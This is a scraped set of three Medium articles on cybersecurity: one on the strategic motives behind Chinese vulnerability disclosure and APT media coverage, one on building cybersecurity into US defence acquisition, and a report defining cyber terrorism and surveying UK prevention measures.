","['Cybersecurity', 'Programming', 'Privacy', 'Data Science', 'Technology']"
Cyber Security Motivations Guessing Game - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/cyber-security-motivations-guessing-game-cbb404728ec7?source=tag_archive---------2-----------------------,"There was a discussion on Twitter about what motivates media attention to infosec, and what does it reveal about the industry, countries, markets and players? This talk was sparked by @agelastic asking why media attention to APTs is so one sided via both volume (Western media) and victim (US/Western victims).
Figuring out what is going on, with any accuracy, when the players are operating in different environments, with different incentives, risks, strategies and goals, and where several key players maintain tight information control… is challenging. Attempting to discern what is happening based on limited information is a great way to be wrong.
China and Russia are different from the US in a number of ways (that matter here.) The competitive security company market place is very different: Russia has Kaspersky; China has the dominant Qihoo360, and two heavyweights (Baidu and Tencent) attempting to muscle in. Neither China nor Russia has a free press to the extent that the US does, so what we can glean from their media reports is much less revealing.
For a company that wants to position itself as a security leader, having a long list of dead bugs to your name is a strong signal. The result of the Baidu, Tencent, and Qihoo contest for cybersecurity mindshare inside China is that Chinese teams dominate activities which have a clear PR benefit.
pwn2own 2016
The contestants are three Tencent teams, one Qihoo team, and one amazingly skilled Korean, lokihardt.
pwn2own 2015
The contestants are more diverse, but include:
pwn0rama 2016
An event held alongside SyScan360 in Singapore had two teams, both from:
Android Security Bulletins
A skim over the last few months of Android security bulletins shows a heavy Chinese investment in bug hunting on Android. The first Qihoo 360 vulnerability was credited in September 2015, and by April 2016 they are a significant presence. Chinese vulnerability hunting teams dominate the April, May, June bulletins, including:
Also worth noting is the targets these teams are hitting: Qualcomm RF components, Linux kernel drivers, and other “interesting” components. There’s no denying that China has formidable vulnerability hunters.
MSRC Top 100
The leadership boards of the top contributors to killing Microsoft vulnerabilities are also telling. The number 2 spot is Tombkeeper, the head of a Tencent security research team, and KeenTeam also make a top50 appearance.
One takeaway from the above data is that Chinese security company competition is a top drivers for vulnerability disclosure. If you’re from the “killing bugs makes the internet inherently safer” camp, then Chinese companies are clearly doing more to secure the Internet than any European company.
There is a more sinister way to interpret this same data though. Maybe it is a strategic cyber operation to deny Chinese adversaries access to critical resources. For example, if your cyber program doesn’t need unpatched vulnerabilities as a critical component but your adversary’s does, you may invest in disclosing vulnerabilities. So more publicly known bugs is good for Chinese cyber teams (who have made extensive use of dead bugs) and bad for Five Eye cyber teams (who have a strong preference for unpatched bugs.)
This is some of what I said on Twitter, but covers more ground. First of all, a motivation for US APT defence companies to promote themselves is that US cybersecurity is a competitive marketplace. Having media coverage about the “problem to solve” and positive mention of “solving the problem” is simply good for business.
Clearly, US APT companies have an incentive to promote their success stories. They also have significant freedom to promote those stories because of the extremely loose control over the US press. Therefore, incentive plus freedom equals “promote ‘the APT problem’ and our ‘APT solutions’ via the media.” Does that mean that there are no APTs? Obviously there are. Does it mean that the problem is overstated? Maybe, maybe not.
Chinese companies are under different market pressures. They are trying to take mindshare and marketshare in a more generic “cybersecurity” space, so focussing on niche issues like APT isn’t so important. Or, maybe Chinese companies are not under threat from APT campaigns stealing IP and as result there is no “APT problem” and thus no market interest in a solution. Or, maybe Chinese companies are unable to detect APTs.
The Chinese government also has a strong incentive to prevent media reports of APTs — security. By not telling the adversary what they know, the Chinese help protect their capabilities by denying the opposition feedback and information. So maybe Chinese companies are not allowed to promote APT reports in the media.
Given the available information, it is simply not possible to tell why Chinese companies aren’t pushing APT reports to the media.
All that I would be comfortable stating is:
Media reports are probably not the best source for understanding an invisible silent war fought in the dark.
Update [2016–11–04]: a Chinese company has dropped some NSA implants. This comes several days after the ShadowBrokers released a list of NSA compromised servers that included a lot of Chinese hosts.
Written by
","['China', 'Cybersecurity', 'Apt']"
Cybersecurity: The Road Ahead for Defense Acquisition,https://medium.com/@DAUNow/cybersecurity-the-road-ahead-for-defense-acquisition-18c85c65aa99?source=tag_archive---------9-----------------------,"Authors: Steve Mills and Steve Monks
This article originally appeared in the May-June 2016 edition of the Defense AT&L magazine, and was first published on April 19, 2016.
The May-June 2014 edition on Defense AT&L magazine included an article by Under Secretary of Defense for Acquisition, Technology, and Logistics Frank Kendall, titled “Protecting the Future,” which stressed Kendall’s concern about the United States’ ability to maintain its technological superiority.
Maintaining that superiority is based not only on adequate funding for leaps in technology but also on honing that technology to protect the capability against cybersecurity threats. The cyber threat we face every day is one of the greatest risks to our ability in developing, delivering and sustaining our war­fighting capability. It is dynamic, adaptable and resilient, with an insidious effect on the accomplishment of the mission.
Over the last two decades, our weapon systems have become more interconnected. We now are in a system-of-systems world. Those weapon systems have become more lethal with the advent of better shared situational awareness and the ability to realize the capabilities of coordinated weapon systems that are greater than the sum of the parts. We have invested greatly in this. Today our systems are the best in the world and continue to ensure our dominance on the battlefield. However, that investment has brought greater dependence and risk. The cyber threat is growing at an increasing rate, and has the potential to significantly degrade and even eliminate our advantage on the current and future battlefield. The risks to our Department of Defense (DoD) systems have reached the point where we must change our thinking about how to combat this threat and who is responsible or involved in this fight.
How vulnerable and resilient are DoD systems against the cyber threat today? Unfortunately, testing continues to show our systems to be extremely vulnerable to the cyber threat. According to a Defense Science Board (DSB) study completed in January 2013 and titled “Resilient Military Systems and the Advanced Cyber Threat,” several key findings provide great insight:
Additionally, more recent testing demonstrates our inability to significantly reduce this risk. The Director, Operational Test and Evaluation (DOT&E) Fiscal Year (FY) 2014 Annual Report reveals several disturbing trends:
Effective cybersecurity of DoD acquisition programs is first and foremost ‘leader business.’
Clearly, the DoD has a lot of work to do to reverse the trend. In response to these trends and the growing cyber threat, Kendall commissioned three additional DSB Task Force Studies on the following cybersecurity focus areas:
These studies will provide additional insight into how to mitigate the cyber threat. Once the findings are released, we will need the attention and support of the entire acquisition workforce and user community to meet this threat head on.
Effective cybersecurity of DoD acquisition programs is first and foremost “leader business.” Few other aspects of our weapon systems possess the potential cost, schedule, performance and risk impacts of cybersecurity. Cybersecurity impacts all facets of our acquisition programs. Leaders are quickly acknowledging the importance of cybersecurity as it relates to acquisition programs but often fail to understand that successfully addressing it in their programs is more than just a funding issue. While increased funding to address cybersecurity in acquisition programs may be required, the solution set is much more. Effective cybersecurity in DoD acquisition programs involves many other aspects such as:
Furthermore, leaders both expect and demand that our systems operate effectively in their intended environment. Leaders are quickly realizing the enormity of the cyber threat and that we now operate in a cyber-contested environment. Cybersecurity being treated as key “leader business” is critical to the overall cybersecurity posture of our DoD acquisition programs.
A key challenge for DoD acquisition addressing the cyber threat is how do we “bake in” cybersecurity for our DoD acquisition programs vs. “bolting it on.” The dominant focus of our cybersecurity efforts today is how to secure systems that are already in the inventory. To effectively integrate cybersecurity into our DoD acquisition systems, we must change our cybersecurity focus from a reactive to a proactive, “shift left” approach. The DoD acquisition enterprise has an obligation to build systems that in the future will minimize real-time cybersecurity crises that cue reactionary measures to mitigate the damage. If we stay in the reactive mode and depend on others within the DoD to address the changing threat, we ultimately will lose our crucial ability to retain the initiative and act within the enemy’s decision cycle. We must execute a shift in this fight and become proactive in every way possible regarding the cyber threat. “Bolting on” cybersecurity solutions is ineffective. The DSB Study of 2013 validates this. This drives greater cost, higher risk and a non-optimal result.
Our proactive, shift-left cybersecurity approach must begin with addressing the warfighter’s requirement. How do we ensure that requirements documents clearly articulate the cybersecurity need? To be sure, the acquisition community and the resources that propel our work is fairly bound by vetted requirements. Just as we have an obligation of trust to deliver secure systems so too do we depend upon the requirements community to get the requirements right. The user community and the Joint Capabilities Integration and Development System (JCIDS) process are our path to ensuring we have the right requirements; it is vital that JCIDS take up the mantle for developing operationally meaningful and proactive cybersecurity effort within the DoD. Our cybersecurity focus must be continually guided by the key JCIDS documents (Initial Capabilities Document, Capability Development Document and Capability Production Document). The designs of our systems are impacted by numerous considerations, which include different operating environments and possible threats posed within the air, land, sea, space and cyberspace domains. These considerations clearly help ensure our systems are both effective and suitable for the warfighter.
In an effort to better define cybersecurity requirements as they relate to our warfighting systems, the Joint Requirements Oversight Council (JROC) issued a JROC Memorandum (JROCM) on June 3, 2015, regarding cybersecurity and its relationship to the System Survivability Key Performance Parameter (KPP). This JROCM titled, Process to Develop Cyber Survivability Endorsement to the System Survivability KPP, asked the Services to “nominate one of their JCIDS military needs documents as use cases” for this effort. The big question is whether or not this effort generates something other than just more cybersecurity controls and/or compliance items. While critically important to achieving and maintaining “cyber hygiene,” cybersecurity controls and compliance with those controls are only parts of the solution set. In the end, cybersecurity in weapon systems acquisition is primarily about operational resiliency in a cyber-contested environment. Achieving this state remains our challenge.
The next critical component of effective and proactive cybersecurity integration into our DoD programs is to treat cybersecurity as a design consideration throughout the entire acquisition life cycle. How do we ensure that cybersecurity is treated as a design consideration with the same pedigree as other critical “ilities” versus being relegated to somewhat ad hoc efforts that are considered only at test time, and sometimes after the production decision? The concept of “shift left” from both a System Security Engineering (SSE) and T&E perspective is where we must go. Shift left from an SSE and T&E perspective is all about proactively addressing cybersecurity requirements “up front and early” in the acquisition life cycle. “Our challenge is to fully integrate cybersecurity into our test processes to help programs identify risks, minimize the attack surface and reduce kill chain effects to improve resiliency.” (Steven J. Hutchison, Defense AT&L magazine, January-February 2015). To be effective and ultimately successful, cybersecurity must be “baked in” the design of our warfighting systems.
Supporting policy and best practices for effective cybersecurity in acquisition programs is another critical component that must be present. There has been significant progress in this area. The recently released PM Guidebook for Integrating the Cybersecurity Risk Management Framework (RMF) into the System Acquisition Lifecycle (https://acc.dau.mil/adl/en-US/722603/file/80119/Cybersecurity%20Guidebook%20v1_0%20with%20publication%20notice.pdf) provides clear guidance on how cybersecurity is integrated into the acquisition life cycle. The Program Manager’s Guidebook also provides two excellent examples of how the RMF is implemented across the acquisition life cycle by acquisition phase. These examples help both leaders and acquisition workforce members gain insight into application of cybersecurity principles.
A key capability for effective integration of cybersecurity into our acquisition programs is through robust T&E in support of the system engineering effort. The recently released Cybersecurity Test and Evaluation Guidebook dated July 1, 2015 (http://www.dote.osd.mil/docs/TempGuide3/Cybersecurity_TE_Guidebook_July1_2015_v1_0.pdf) provides clear guidelines and best practices to support ongoing and future cybersecurity T&E. This guidebook is divided into two key components. The first component provides essential information for T&E personnel on how to effectively support the RMF. The remaining component describes and addresses the implementation of cybersecurity T&E across the acquisition life cycle. Combining the T&E-related guidance provided by the cybersecurity T&E with the overarching focus of the Program Manager’s Guidebook for Integrating the Risk Management Framework provides both leaders and acquisition workforce member’s critical insight into how cybersecurity should be integrated into the DoD acquisition life cycle.
Who in the acquisition workforce needs to be involved in addressing the cyber threat? The short answer is: Just about everyone! Cybersecurity continues to remain a team sport. The threat is growing, dynamic and evolving. It is a difficult problem. Acquisition workforce members need to be both aware and proactive from a cybersecurity perspective. If this occurs, the DoD can win this fight. If everyone takes the attitude that it’s someone else’s issue, the DoD will remain at risk. In the past, the focus of cybersecurity (formerly called information assurance) was security of the network and was primarily a concern for Information Technology career field personnel. This is clearly no longer the case. Cybersecurity is now a concern for all career fields and applies to all DoD systems that process DoD information.
To be successful in this effort, the DoD needs the energy, critical thinking and focus of the entire acquisition community, user community and our industry partners right now. This will take time to get right, but it can and must be done. In the end, it will come down to hard work, motivated acquisition professionals in all career fields treating cybersecurity as a design consideration, and informed leaders who make cybersecurity of DoD acquisition programs a priority.
Mills and Monks are professors of Program Management at the Defense Acquisition University’s South Region in Huntsville, Alabama, where Mills also is the Region’s Cyber Lead.
The authors can be contacted at steve.mills@dau.mil and steve.monks@dau.mil.
Written by
","['Cyber Deterrence', 'Cyber Defense ', 'Cybersecurity', 'Strategy']"
Cyber Terrorism: understanding and preventing acts of terror within our cyber space,https://littlefield.co/cyber-terrorism-understanding-and-preventing-acts-of-terror-within-our-cyber-space-26ae6d53cfbb?source=tag_archive---------1-----------------------,"Contents 2. Executive Summary 2.1 Keywords 3. Introduction 3.1 Aim and methodology 4. What is cyber terrorism? 4.1 Origins and definitions of cyber terrorism 4.2 Case studies 4.3 Areas of cyber terrorism 4.4 Potential threats 5 Present and future security measures 5.1 What is being done to prevent cyber terrorism? 5.2 Preventions, mitigations and consequence management of future attacks 6. Conclusion and suggestions moving forward 7. References
2. Executive Summary
A number of terrorist incidents over the past 20 years have resulted in a large amount of concern, research and action against acts of terrorism within our cyber space. As we continually move into a society ever more reliant on technology, the threat posed to nations from terrorists is no longer just physical but also expands to our digital world. This work aims to provide readers with an understanding as to what cyber terrorism is, its causes and the strategic approaches in place to prevent damage caused by it. Its aim is to not address exclusively the current nature of cyber crime, but to provide an overall perspective of cyber terrorism in all its facets over a larger time scale. This report covers literature from academic texts, books and news articles over the past 20 years. In addition, when discussing legislation or government organisations in general, particularly within section 4, this will refer to that of the United Kingdom’s. Key findings This report concludes the following key messages essential to understanding cyber terrorism whilst supporting current and future methods of prevention: • Terrorism is no longer bound by the means of creating harm in the physical world; • Terrorism holds an agenda often, though not limited to, religious, cultural, social, economic and political; • By definition cyber terrorism means to damage information, computer systems and data that result in harm against non-combatant targets; • The boundaries between acts of cyber terrorism, cyber crime and ‘Hacktivism’ are often interlinked; • Society faces a number of threats without our cyberspace, particularly to industrial control systems operating power grids and nuclear stations; • Terrorist organisation are promoting the use of computing expertise to implement cyber attacks against targets; • Though there are many organisations built to respond to cyber terrorism, a large amount of society is still unaware of the potential threat cyber terrorism poses; • Systems are often developed without security in mind; • Continually developing identification, tracing and mitigation methods to cyber terrorism is essential.
2.1 Keywords Botnets , Computer crime , Computer science , Cyber attacks , Cyber crime , Cyber security , Cyber space , Cyber terrorism , DDoS , DoS , Hacktivism , Industrial Control Systems , Machine learning , Mitigation , Prevention , Terrorism , Vulnerabilities , Zero-day attacks
3. Introduction
The act of terrorism is one of the most concerning and important areas of security for all national states. As discussed by Garrison (2003), terrorism has a history of over 2000 years, dating back to 48 AD whereby the Jewish resistance group Sicarii-Zealots carried out attacks against Romans. These campaigns involved the infiltration of Roman cities to assassinate and kidnap Jewish collaborators and Roman soldiers (Hudson, 1999). More recently, the terror attacks on the United States of America on September 11th and others across the world before that, pose a long lasting threat to the world by groups of individuals with particular motivations, willing to cause harm to innocent civilians to promote their cause. Whilst these groups are non-national state groups, The United States state Department additionally discusses that nations such as Iran, Iraq, Sudan, Libya, North Korea, Cuba and Syria are known to have supported terrorist organisations (United States Department of State, 2002). Because of this, it is evermore important that we protect ourselves against these threats by understanding their means and implementing security against attacks. Many of these terrorist groups seek to inflict harm in many differing forms, that being both physically and digitally. As technology progresses, the growing risk of cyber terrorism is more apparent. 3.1 Aims and methodology This study aims to address the growing concern of cyber terrorism across the globe. Addressing the challenges surrounding cyber terrorism, current control of the threat and discussing methods improving the response to this form of cyber crime. The report seeks to provide a general understanding of cyber terrorism in all forms, detailing previous events in order to understand its causes and preventions from a strategic perspective. This report is structured into three sections. • Section 4 addresses and defines what cyber terrorism is, looking specifically at prior cases of cyber terrorism with the intention of gauging a full understanding as to what cyber terrorism is and how it differentiates itself from cyber crime and the likes of Hacktivism. Additionally discussing methods and potential threats. • Section 5 takes in to consideration everything discussed in the prior sections, to provide a general overview of the current measures being taken in order to protect against cyber terrorism threats. Whilst also discussing prevention and mitigation of attacks in the future. • Section 6 will conclude the report and detail three areas of consideration for improving the prevention of cyber terrorism.
4. What is Cyber Terrorism?
There is often a large amount of confusion as to what cyber terrorism is. More specifically, what cyber attacks can we actually define as acts of terrorism? The internet has allowed for a vast exchange of information. Thus has created a cyber space in which both criminals and terrorists can implement attacks/communications. This use of cyber space results in there no longer being simply a physical threat of terrorism. When we consider what cyber terrorism actually is, we must first understand the motivations behind cyber attacks. Cyber attacks can come in many differing forms, and it is these forms that help us understand whether the attack is of crime or terror. Figure 1 shows the distribution of cyberattacks across cultural, social, economic and political motivations. Gandhi et al. (2011) discusses that often these dimensions of motivations can often cross over and the motivating factors behind cyber attacks are needed to be carefully considered when we discuss cyber terrorism.
Figure 1. The distribution of cyber-attacks across cultural, social, economic and political motivations
4.1 Origins and Definitions of Cyber Terrorism
Over recent decades, it has become apparent that our society is becoming increasingly information technology dependant. Though many of us utilise technology for our own benefit, in aiding and supporting our lives in many ways, it also introduces many differing risks and vulnerabilities to our society. Those who use computer technology to commit crimes and acts of terror pose an alarming threat across the globe as we become ever more dependant on information technology. The use of computer technology and cyber-dependant attacks is becoming a more prominent threat by terrorist groups; this emerging threat defines itself as cyber terrorism. Cyber-dependant terrorist acts had often been speculated in the early 90s, as networks became far more diverse across the globe. The United State’s Former Deputy Secretary of Defence John Hamre testified in a congressional hearing in 1997, regarding the growing threat on cyber security, defining it by saying: “We’re facing a possibility of an electronic Pearl Harbor. There is going to be an electronic attack on this country some time in the future” It’s not unreasonable to state that the attention of cyber-dependant terrorism is not an often discussed subject when we think about acts of terrorism. A large amount of the attacks we’ve seen over recent years are often committed physically, thus the question arises as to, what defines cyber terrorism? What is currently being done? What are we doing to protect ourselves against these attacks? Janczewski, & Colarik (2008) defines cyber terrorism as: “Cyber terrorism means pre-mediated, politically motivated attacks by sub national groups or clandestine agents or individuals against information and computer systems, computer programs, and data that results in violence against non-combatant targets.” In addition to this it’s important to discuss the term cyber crime. Cyber crime, often used by government agencies, refers to the use of information technology to commit a crime, often involving financially motivated cyber attacks. Furthermore, the term Hacktivism, also refers to the application of hacking techniques against targets to cause damage or disrupt normal operations, however not causing serious damage (Denning, 2001). Moreover, often the methods used in cyber crime, Hacktivism and cyber terrorism, are very much similar. Thus, it’s important to define that cyber terrorism uses information technology in order to inflict violence with a particular political motivation. Vatis (2001) also defines that four common areas of cyber terrorism are firstly pre-meditated, politically motivated, targeted at civilians and committed by groups not associated with national armies. As discussed, it’s essential to understand that cyber terrorism in essence refers to the cohesion between cyber space and terrorism (Denning 2001).
4.2 Case studies
Whilst the line between the definitions of cyber terrorism, cyber crime and Hacktivism can in many cases be somewhat ambiguous, the following case studies depict scenarios in which cyber-dependant attacks can be attributed to a terrorist organisation or political motive. This, along with the definition seen in section 2.1, can allow us to discuss cases of what we can vaguely define as cyber terrorism. There are in fact many authors that detail there being no definitive cases that give a clear indication of cyber terrorism (Akhgar, Staniforth, & Bosco, 2014), thus this attribution is important to recall within this section. Denning (2000) cites that the first characterised act of cyber terrorists, identified by intelligence authorities, was by Tamil Tigers, guerrilla terrorists in Sri Lanka 1998. Sri Lankan embassies, were sent 800 emails a day for over two weeks with a message that read “We are the Internet Black Tigers and we’re doing this to disrupt your communications”. In addition to this, Denning (2000) also discusses the Japanese terrorist group Aum Shinrikyo, who over numerous years have various cases of cyber attacks to aid this terrorism. In 2000, an investigation discovered that the Japanese government had been using software developed by a company associated with Aum Shinrokyo (Akhgar, Staniforth, & Bosco, 2014). It’s reported that Aum had collected sensitive data regarding nuclear weapons, to which they had previously discussed purchasing with Russia in 1993 (RAND Corporation, 2005). Finally, in more recent events a Pro-Palestinian hacker group titled “Nightmare” implemented a Distributed Denial of Service attack on the Tel Aviv Stock Exchange, Tel Al Airlines and First International Bank of Israel websites. “The penetration of Israeli websites opens a new sphere of opposition and a new electronic warfare against the Israeli occupation”
4.3 Areas of Cyber Terrorism
As discussed many acts of cyber terrorism are often synonymous with acts of cyber crime. Thus the means by which attacks are implemented by terrorists may also be done by criminals. These can come in many forms, as discussed by GCHQ and Cert-UK (2015), attacks are often either un-targeted or targeted. These can include, though not limited to: Un-targeted Attacks • Phishing — These attacks typically involve fraudulent emails to convince a target of it’s legitimacy of a user or organisation in order to attain private information (E.g, passwords, banking information, identity theft etc.) (“What are phishing scams and how can I avoid them?”, 2017) • Watering Hole — The deployment of a fake webpage to compromise the original, in order to attack visiting users (e.g the downloading of Remote Access Tools) (National Cyber Security Centre, n.d.) • Ransomware — Infecting a system by encrypting files and/or locking the users access to said system. Then requiring a ‘ransom’ to gain normal access again. (“Protecting your organisation from ransomware”, 2016) • Scanning — Testing for vulnerabilities in specific internet networks or systems to deploy attacks on a wider scale to attack at random (GCHQ, Cert-UK, 2015).
Targeted Attacks • Spear-Phishing — These attacks are much the same as the’ Phishing’ mentioned previously, however specifically targeted at an individual or organisation. • Distributed Denial of Service — This is to deploy a mass amount of packet requests, often from a Botnet , to a 1 website or network in order to overload the system and prevent regular access by legitimate users. • Supply chain — attacking an element of an organisation before it arrives (GCHQ, Cert-UK, 2015). • Zero-day — Bespoke exploitation of a system with specific vulnerabilities not yet known to the author (National Cyber Security Centre, 2016).
4.4 Potential threats
In 2007, an experimental cyber attack titled the “Aurora Generator Test”, researchers found that by altering the software of a power generator remotely they could cause the turbines to set fire and thus eventually cause serious damage to the generator. This is an example of a relevant threat from cyber terrorists on the Industrial Control Systems (ICS) within the industrial sector. In a report on the infrastructure of these control systems and their potential threat by terrorists, Dana Shea (2003) cites: “Industrial control system technologies are often employed in critical infrastructure industries to allow a single control center to manage multiple sites. Industrial control systems were originally implemented as isolated, separate networks. They were viewed as secure systems which protected remote locations from being physically broken into and mistreated. For example, the establishment of remote control systems in dams were believed to protect against unlawful release of the dammed water, as no hand-operable valves and switches were accessible.” A botnet is a number of computers connected to the internet that has been set up to forward requisitions to other 1 computers amongst other tasks. Often the owner of a botnet device will be unaware of it on their system. This simulation is an example of how possible large scale cyber attacks can be implemented to the industrial sector and highlights the importance of its security. When considering potential threats from cyber terrorism we must look at the industries that may be targeted. It’s not unreasonable to state that given the outcome of the Aurora Generator Test, the industrial sector poses large risk factors to cyber terrorist attacks. Cyber threats to ICS are not uncommon, even before the Aurora Generator Test, incidences of cyber attacks to critical infrastructure are documented. Maras (2014) cites that in 2000 a Russian hacker gained control of an ICS that operated the flow of natural gas. She goes on to state “Hypothetically, this hacker could have easily increased the gas pressure until the valves broke, causing an explosion”. Though this case is not attributed to a terrorist or organisation and is considered an individuals attack, it’s a notable case of the potential threats to a nations or organisations ICS. As a result, it’s evidently clear that there is a large amount of threat to this infrastructure. Furthermore, and in more recent years, terrorist groups are publishing media promoting cyber attacks on these infrastructures and internet services. In 2011, the Al-Qaeda’s media outlet Al-Shahab released a report calling for “Electronic Jhiad’s” to attack companies and governments opposing their beliefs. The reporter states: “We advise experts within this field to target the websites and networks of large companies and the governments of countries that attack the Muslims. They should focus on websites of networks run by media centres that fight Islam, Jihad, and the mujahideen.” (“Al-Qaeda Al-Sahab Video on E-Jihad”, 2011) In addition, the report goes on to detail Distributed Denial of Service attacks conducted by hacker Michael Calce in February 2000 and how DDoS attacks work. In 2012, a report released by the United States Senate Committee on Homeland Security and Governmental Affairs detailed a video from the terrorist group Al-Qaeda. The video called for cyber attacks against the United State’s critical infrastructure, including the power grid and water supply (Clohery, 2012). It’s assumed that these cyber attacks are aimed to exploit vulnerabilities in ICS’s, similar to those discovered in the “Aurora Generator Test”. Commenting on the Al Qaueda video, U.S. Senator Joseph Lieberman stated “Congress needs to act now to protect the American public from a possible devastating attack on our electric grid, water delivery system or financial networks” (Freeman, 2014). Though this is not the only potential threat we see from cyber terrorism, it’s apparent that potential attacks such as this pose a large threat to society. from cyber terrorists and is certainly of concern for governments and organisations across the globe.
5. Measures being pursued
As cyber terrorism is one the fastest growing threats, not only to individuals, public and private organisations, but to nations as a whole, we must ensure that the correct methods of prevention are being actioned. This involves both gathering preliminary reconnaissance on potential threats whilst managing current threats. The digital infrastructure each of our nations holds is under constant observation for vulnerabilities, thus cyber security professionals must be ready for an imminent threat from this act of terrorism. Drawing from what we have already discussed in this report, in order for us to look into the current and future measures to take, it would be productive to consider the following pertinent questions: 1. What do we foresee terrorists wanting to do in cyberspace? 2. How can we prevent these actions? 3. How can we be proactive against these actions? We’ve examined in section three some possible answers to question one. This being that terrorists look to utilise cyberspace in order to: 1. Support their motivation, whether that be their religious, social, cultural, political or economical beliefs 2. Attack critical infrastructures and services in society 3. Utilise cyber space to inflict harm to others In addition to this it’s also important to state that cyber terrorists may also employ cyberspace not only to cause harm, but also to facilitate their activities, including the likes of encrypted communications, laundering of finances, recruitment and promotion of their activities.
5.1 What is being done to prevent cyber terrorism?
We must be reasonable in assuming the potential threats discussed thus far in this report can be actioned at any time, without warning. Most of our digital infrastructure already has a large amount of defence, as detailed by Beggs, & Butler (2004); current technologies include the likes of: firewalls, password protection systems, key encryption (e.g 3DES, RSA), stenography, intrusion dectection systems, Secure Socket Layer (SSL), IPsec, access control lists etc. When discussing acts of terrorism in general, the responsibility of prevention normally falls to governments and national organisations. Looking at the United Kingdom’s government actions against cyber terrorism, our national security is lead by our Intelligence Services such as the Ministry of Defence, Government Communications Headquarters, Military Intelligence Section 5 and 6. Addressing this, the British government categorise cyber attacks as a Their One threat to national security (“2010 to 2015 government policy: cyber security”, 2015). These services cover investigations into acts of cyber terrorism, analysis and surveillance of potential threats. Addressing the growing concern of cyber attacks from not only acts of terrorism, but also crime, a subdivision of GCHQ the National Cyber Security Centre (NCSC) was launched in 2017. Head of NCSC, Ciaran Martin, stated that the organisation had already handled 188 high-level cyber attacks against the nation across three months prior to NCSC opening (“Britain to enter ‘new era of online opportunity’”, 2017). Organisations such as NATO are also taking action against cyber terrorism threats, with allies making a ‘Cyber Defence Pledge’ in July 2016 (“Cyber defence”, 2017). Taking a proactive response to threat intelligence, the government also launched the Cyber security Information Sharing Partnership (CiSP) in 2013 which allowed for a greater level of communication between private sector and public sector security professionals (“2010 to 2015 government policy: cyber security”, 2015). Moreover, the Centre for the Protection of National Infrastructure also addresses its work with organisations that support the United Kingdoms digital infrastructure such as that discussed in section 3.4. The intention of this is to greatly improve communication between both government bodies and private organisations, in order to strengthen our networks against cyber attacks. In the Cabinet Office’s annual report on the United Kingdom’s Cyber Security Strategy, the government addresses their actions against cyber attacks to the nation and details their spending review on cyber security, see figure 2 (Office of Cyber Security and Information Assurance, 2016).
Figure 2. Five year spending review of the government program to improve the National Cyber Security Strategy
5.2 Preventions and mitigations of future attacks
Over recent years vulnerabilities in softwares and new technologies have proved that security is not often at the forefront of priority during it’s development. An example being, The Internet of Things (IoT) devices, which have been widely discussed in the past few years due to this issue. Reporter Lucian Constantin (2015) cites that: “The research was performed by a team from application security firm Veracode for six up-to-date devices acquired in December and found serious issues in five of them” In addition to this a study conducted by the MIT Sloan Management Review reports that companies are alarmingly unconcerned with the security of such devices (Ulmanu, 2017). Moving forward, it’s notable that a large amount of our cyberspace is built without security in mind and organisations may not be fully aware of the risks of the technologies they are using. Thus, a valuable method of developing prevention against cyber terrorist threats before they could happen, is by implementing security as one of the integral parts of development in softwares and devices. Whilst our government has many deterrents for those committing cyber attacks, the probability of getting caught is often in the minds of criminals, it could be said that for terrorist and terrorist organisations this is not a concern. As a result, when discussing prevention methods against cyber terrorism as appose to that of cyber crime, the methods must be considered differently due to the perspective of the attacker. Often terrorist have no legislation to follow and are not concerned with the consequences of identification before or during an attack. Concluding that it is of vital importance for preliminary reconnaissance, defence and action to identify attackers is made in the swiftest of nature. Intrusion detection is one of the most active areas of research within cyber terrorism over the past 20 years (SANS Institute, 2003). Creating safe barriers, both within our systems and physically, are necessary in order to identify occurring attacks in order to implement the right method of mitigation. Many of these techniques, as previously discussed, include the likes of encryption. Passwords, could be seen as one of the oldest methods of intrusion detection. As these methods get more widely used, vulnerabilities become more common. It’s notable that in order to develop the mitigation of an attack, we must constantly develop new intrusion detection systems in order to be as effective as possible during an attack. Not only does this improve the mitigation, but it also allows for a compartmentalisation of a system to allow for a limitation of possible damage and thus protecting valued assets before irreparable damage occurs. Additionally, responses to cyber attacks can be improved by focusing more attention on preserving data during an attack. As discussed by many security professionals across the globe, often data breaches are not recently backed up, thus it is vital to have up to date versions of systems or databases at all times. Limiting the amount of damage caused after a cyber attack is an essential part of incident management. This is a primary stage of recovering and responding to an act of cyber terrorism and enables for future protections. 6. Conclusion and suggestions moving forward One of the largest conclusions to convey from this report is the importance that cyber terrorism must be considered as an imminent threat at all times. Terrorists hide within our society until they action an attack. When we discuss terrorism, this accounts for space both physically and digitally. Each and every terrorist has specific motivations that they wish to convey by inflicting harm, shown in section 3. This must always be considered when looking for potential attacks, like the potential threats to Industrial Control Systems discussed in section 3.4. It is important that counter terrorism methods use this exposure to their advantage. Understanding where cyber terrorism may occur and developing a proactive response to potential threats is essential. We have learnt that whilst a cyber attack can be actioned at any time or place, developing the methods for identifying and tracing terrorist is of vital importance in each an every jurisdictions. This may involve the likes of surveillance, tightening cyber crime laws or developing technology to detect intrusions to systems. Whilst the prevention of cyber terrorism, examined in section 4, is one of the largest concerns for our government, as it is evidently being developed further, the following suggestions are made to aid in improving the response of cyber threats: 1. Implementing ‘Fire Drill’ procedures, effectively testing the security of systems, mitigation and incident response of an attack. This is particularly emphasised for Industrial Control Systems. 2. Understanding the importance of developing and improving identification technologies, with a particular focus on gathering preliminary reconnaissance on cyber threat intelligence. Methods that could be considered or expanded include the likes of data mining and machine learning to predict potential attacks. 3. Providing a greater amount of education to private and public sector organisations that are developing technologies used that may be at risk from cyber terrorism. Those developing new systems must ensure that security is at the forefront of focus during it’s creation in order to limit the amount of vulnerabilities it may have.
6. References
2010 to 2015 government policy: cyber security. (2015). Gov.uk. Retrieved 25 April 2017, from https://www.gov.uk/ government/publications/2010-to-2015-government-policy-cyber-security/2010-to-2015-government-policy-cyber-security Akhgar, B., Staniforth, A., & Bosco, F. (2014). Cyber crime and cyber terrorism investigator’s handbook (1st ed.). Waltham, MA: Syngress. Al-
Qaeda Al-Sahab Video on E-Jihad. (2011). Cjlab.memri.org. Retrieved 24 April 2017, from http://cjlab.memri.org/labprojects/clips-on-cyber-jihad/al-qaeda-al-sahab-video-on-e-jihad/
Beggs, C., & Butler, M. (2004). Developing New Strategies to Combat Cyber-Terrorism. http://dx.doi.org/ 10.4018/978–1–59140–261–9.ch099
Brenner, S. (2010). Cyber threats (1st ed.). Oxford: Oxford Univ. Press. Britain to enter ‘new era of online opportunity’. (2017). Ncsc.gov.uk. Retrieved 25 April 2017, from https:// www.ncsc.gov.uk/news/britain-enter-new-era-online-opportunity
